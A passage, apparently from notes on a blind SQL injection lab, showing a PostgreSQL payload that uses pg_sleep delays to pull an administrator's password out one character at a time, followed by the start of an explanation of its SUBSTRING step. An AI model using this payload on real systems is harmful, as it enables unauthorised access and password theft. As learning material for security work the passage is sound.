...
(xyz'|| (SELECT CASE WHEN SUBSTRING(password, POS, 1)='CHAR' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- ).
where 
1) SUBSTRING(password, POS, 1) → means the database should take 1 character from the password at position POS.
